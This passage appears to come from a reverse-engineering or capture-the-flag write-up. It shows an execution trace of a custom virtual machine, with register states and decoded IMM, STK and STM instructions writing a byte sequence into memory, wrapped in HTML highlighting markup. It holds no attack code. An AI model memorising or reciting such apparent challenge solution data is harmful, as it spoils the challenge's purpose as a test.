class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x52<span class="hljs-comment">// opcode:0x20  IMM</span><br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x1<span class="hljs-comment">// opcode:0x4STK</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">i</span> d<br><span class="hljs-selector-attr">[s]</span> ... pushing d<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x53 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x6a<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x6a<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x6a s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x54 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9c<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9c d:<span class="hljs-number">0</span>x6a s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x55 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<span class="hljs-comment">// a1[0x9c] = 0x6a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9c d:<span class="hljs-number">0</span>x6a s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x56 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x39<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x39<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9c d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x57 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9d<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9d d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x58 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<span class="hljs-comment">// a1[0x9d] = 0x39</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9d d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x59 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xf2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xf2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9d d:<span class="hljs-number">0</span>xf2 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9e d:<span class="hljs-number">0</span>xf2 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9e d:<span class="hljs-number">0</span>xf2 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x34<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x34<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9e d:<span class="hljs-number">0</span>x34 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9f<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9f<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9f d:<span class="hljs-number">0</span>x34 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9f d:<span class="hljs-number">0</span>x34 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x50<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x50<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9f d:<span class="hljs-number">0</span>x50 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x60 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa0<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa0<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa0 d:<span class="hljs-number">0</span>x50 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x61 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa0 d:<span class="hljs-number">0</span>x50 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x62 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x39<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x39<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa0 d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x63 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa1<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa1 d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x64 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa1 d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x65 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x38<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x38<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa1 d:<span class="hljs-number">0</span>x38 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x66 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa2<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa2 d:<span class="hljs-number">0</span>x38 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x67 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa2 d:<span class="hljs-number">0</span>x38 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x68 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xbf<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xbf<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa2 d:<span class="hljs-number">0</span>xbf s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x69 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa3<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa3<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa3 d:<span class="hljs-number">0</span>xbf s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa3 d:<span class="hljs-number">0</span>xbf s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xee<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xee<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa3 d:<span class="hljs-number">0</span>xee s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa4<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa4<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa4 d:<span class="hljs-number">0</span>xee s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa4 d:<span class="hljs-number">0</span>xee s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xd8<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xd8<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa4 d:<span class="hljs-number">0</span>xd8 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa5<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa5 d:<span class="hljs-number">0</span>xd8 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x70 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa5 d:<span class="hljs-number">0</span>xd8 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x71 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x65<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x65<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa5 d:<span class="hljs-number">0</span>x65 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x72 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa6<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa6<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa6 d:<span class="hljs-number">0</span>x65 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x73 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa6 d:<span class="hljs-number">0</span>x65 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x74 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xe0<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xe0<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa6 d:<span class="hljs-number">0</span>xe0 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x75 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa7<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa7<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa7 d:<span class="hljs-number">0</span>xe0 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x76 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa7 d:<span class="hljs-number">0</span>xe0 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x77 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x15<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x15<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa7 d:<span class="hljs-number">0</span>x15 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x78 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa8<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa8<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa8 d:<span class="hljs-number">0</span>x15 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x79 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa8 d:<span class="hljs-number">0</span>x15 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x6b<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x6b<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa8 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa9<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa9<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<span class="hljs-comment">// a1[0xa9] = 0x6b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x8a<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>x8a<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span 